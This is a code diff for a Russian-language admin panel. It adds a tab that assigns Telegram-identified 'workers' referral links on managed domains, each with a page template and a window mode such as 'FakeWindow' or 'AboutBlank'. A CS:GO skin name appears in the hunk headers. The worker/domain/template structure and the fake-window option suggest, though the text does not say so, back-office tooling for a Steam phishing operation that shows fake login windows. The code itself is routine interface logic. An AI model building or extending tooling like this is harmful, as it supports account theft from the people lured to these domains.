@@ -831,17 +831,18 @@ MAC-10 | Neon Rider (Factory New)</textarea>
   }
 
   async function renderSites() {
-    let sitesTab = "domains";
+    let sitesTab = "referrals";
     let selectedDomainId = null;
 
     main.innerHTML = `
       <div class="greeting">
         <div>
           <h1 class="greeting-title">Сайты</h1>
-          <p class="greeting-sub" id="sitesSub">Панель доменов и воркеров uproject</p>
+          <p class="greeting-sub" id="sitesSub">Реферальные ссылки воркеров и домены</p>
         </div>
         <div class="period-pills" id="sitesTabs">
-          <button type="button" class="period-pill is-active" data-sites-tab="domains">Домены</button>
+          <button type="button" class="period-pill is-active" data-sites-tab="referrals">Рефералки</button>
+          <button type="button" class="period-pill" data-sites-tab="domains">Домены</button>
           <button type="button" class="period-pill" data-sites-tab="templates">Шаблоны</button>
           <button type="button" class="period-pill" data-sites-tab="workers">Воркеры</button>
         </div>
@@ -868,6 +869,7 @@ MAC-10 | Neon Rider (Factory New)</textarea>
       try {
         if (sitesTab === "workers") await renderWorkers();
         else if (sitesTab === "templates") await renderTemplatesVisibility();
+        else if (sitesTab === "referrals") await renderReferrals();
         else if (selectedDomainId) await renderDomainDetail(selectedDomainId);
         else await renderDomains();
       } catch (e) {
@@ -877,11 +879,141 @@ MAC-10 | Neon Rider (Factory New)</textarea>
               <div class="empty">
                 <div class="empty-title">Не удалось открыть сайты</div>
                 <div class="empty-sub">${escapeHtml(e.message)}</div>
-                <p class="muted" style="margin:12px 0 0">Нужен аккаунт панели сайтов у текущего админа (создайте в карточке участника).</p>
               </div>
             </div>
           </div>`;
       }
+    }
+
+    async function renderReferrals() {
+      const data = await PanelAPI.get("/admin/sites/referrals", { force: true });
+      const templates = data.templates || [];
+      sub.textContent = `Реферальных ссылок: ${data.total || 0}`;
+      body.innerHTML = `
+        <div class="panel-card">
+          <div class="panel-card-body" style="padding-top:16px">
+            <div class="search-row" style="margin-bottom:12px">
+              <input class="search-input" id="refSearch" placeholder="Поиск: @user, telegram id, path, домен" />
+            </div>
+            <div class="table-wrap">
+              <table class="data">
+                <thead>
+                  <tr>
+                    <th>Воркер</th>
+                    <th>Домен</th>
+                    <th>Ссылка</th>
+                    <th>Шаблон</th>
+                    <th>Окно</th>
+                    <th></th>
+                  </tr>
+                </thead>
+                <tbody id="refsBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      `;
+      const tbody = document.getElementById("refsBody");
+      const rows = data.referrals || [];
+
+      const paint = (filter = "") => {
+        tbody.innerHTML = "";
+        const q = String(filter || "").trim().toLowerCase();
+        const filtered = !q
+          ? rows
+          : rows.filter((r) =>
+              [r.username, r.telegramId, r.customId, r.domainName, r.path, r.url]
+                .map((v) => String(v || "").toLowerCase())
+                .join(" ")
+                .includes(q)
+            );
+        if (!filtered.length) {
+          tbody.innerHTML = `<tr><td colspan="6" class="muted">Пусто</td></tr>`;
+          return;
+        }
+        filtered.forEach((r) => {
+          const tr = document.createElement("tr");
+          const tplOptions = templates
+            .map(
+              (t) =>
+                `<option value="${t.id}">${escapeHtml(t.name || `Template #${t.id}`)} (#${t.id})</option>`
+            )
+            .join("");
+          tr.innerHTML = `
+            <td>
+              ${r.username ? `@${escapeHtml(r.username)}` : "—"}
+              <div class="muted"><code>${escapeHtml(r.telegramId)}</code></div>
+            </td>
+            <td>${escapeHtml(r.domainName || `#${r.domainId}`)}</td>
+            <td><code style="word-break:break-all">${escapeHtml(r.url || r.path || "—")}</code></td>
+            <td>
+              <select class="search-input ref-template" style="min-width:160px;max-width:220px">
+                <option value="">Шаблон…</option>
+                ${tplOptions}
+              </select>
+            </td>
+            <td>
+              <select class="search-input ref-window" style="min-width:140px">
+                <option value="">Окно…</option>
+                <option value="FakeWindow">FakeWindow</option>
+                <option value="CurrentWindow">CurrentWindow</option>
+                <option value="NewWindow">NewWindow</option>
+                <option value="AboutBlank">AboutBlank</option>
+              </select>
+            </td>
+            <td class="drawer-actions"></td>
+          `;
+          const cell = tr.lastElementChild;
+          const save = document.createElement("button");
+          save.className = "btn-primary";
+          save.textContent = "Сохранить";
+          save.onclick = async () => {
+            const templateId = tr.querySelector(".ref-template").value;
+            const windowType = tr.querySelector(".ref-window").value;
+            if (!templateId && !windowType) {
+              toast("Выберите шаблон или окно", "error");
+              return;
+            }
+            try {
+              await PanelAPI.patch(`/admin/sites/referrals/${r.telegramId}/${r.domainId}`, {
+                templateId: templateId || undefined,
+                windowType: windowType || undefined,
+              });
+              toast("Обновлено");
+            } catch (e) {
+              toast(e.message, "error");
+            }
+          };
+          const del = document.createElement("button");
+          del.className = "btn-ghost btn-danger";
+          del.textContent = "Удалить";
+          del.onclick = async () => {
+            if (
+              !confirm(
+                `Удалить рефералку ${r.username ? "@" + r.username : r.telegramId} на ${r.domainName || r.domainId}?`
+              )
+            ) {
+              return;
+            }
+            try {
+              await PanelAPI.del(`/admin/sites/referrals/${r.telegramId}/${r.domainId}`);
+              toast("Удалено");
+              await renderReferrals();
+            } catch (e) {
+              toast(e.message, "error");
+            }
+          };
+          const open = document.createElement("button");
+          open.className = "btn-ghost";
+          open.textContent = "Карточка";
+          open.onclick = () => openMember(r.telegramId);
+          cell.append(save, del, open);
+          tbody.appendChild(tr);
+        });
+      };
+
+      paint();
+      document.getElementById("refSearch").addEventListener("input", (e) => paint(e.target.value));
     }
 
     async function renderDomains() {
@@ -999,6 +1131,13 @@ MAC-10 | Neon Rider (Factory New)</textarea>
                 <tbody id="siteLinksBody"></tbody>
               </table>
             </div>
+            <div class="settings-row-title" style="margin:20px 0 8px">Рефералки воркеров</div>
+            <div class="table-wrap">
+              <table class="data">
+                <thead><tr><th>Воркер</th><th>Ссылка</th><th></th></tr></thead>
+                <tbody id="siteRefsBody"></tbody>
+              </table>
+            </div>
             ${
               d.isOwn
                 ? `<div class="drawer-actions" style="margin-top:16px"><button type="button" class="btn-ghost btn-danger" id="siteDomainDelete">Удалить домен</button></div>`
@@ -1019,7 +1158,35 @@ MAC-10 | Neon Rider (Factory New)</textarea>
         linksBody.appendChild(tr);
       });
       if (!(detail.links || []).length) {
-        linksBody.innerHTML = `<tr><td colspan="4" class="muted">Ссылок нет</td></tr>`;
+        linksBody.innerHTML = `<tr><td colspan="4" class="muted">Ссылок владельца нет</td></tr>`;
+      }
+
+      const refsBody = document.getElementById("siteRefsBody");
+      (detail.referrals || []).forEach((r) => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${r.username ? `@${escapeHtml(r.username)}` : escapeHtml(r.telegramId)}</td>
+          <td><code style="word-break:break-all">${escapeHtml(r.url || r.path || "—")}</code></td>
+          <td class="drawer-actions"></td>
+        `;
+        const del = document.createElement("button");
+        del.className = "btn-ghost btn-danger";
+        del.textContent = "Удалить";
+        del.onclick = async () => {
+          if (!confirm(`Удалить рефералку ${r.username ? "@" + r.username : r.telegramId}?`)) return;
+          try {
+            await PanelAPI.del(`/admin/sites/referrals/${r.telegramId}/${r.domainId}`);
+            toast("Удалено");
+            await renderDomainDetail(domainId);
+          } catch (e) {
+            toast(e.message, "error");
+          }
+        };
+        tr.lastElementChild.appendChild(del);
+        refsBody.appendChild(tr);
+      });
+      if (!(detail.referrals || []).length) {
+        refsBody.innerHTML = `<tr><td colspan="3" class="muted">Рефералок на этом домене нет</td></tr>`;
       }
 
       document.getElementById("sitesBack").addEventListener("click", () => {
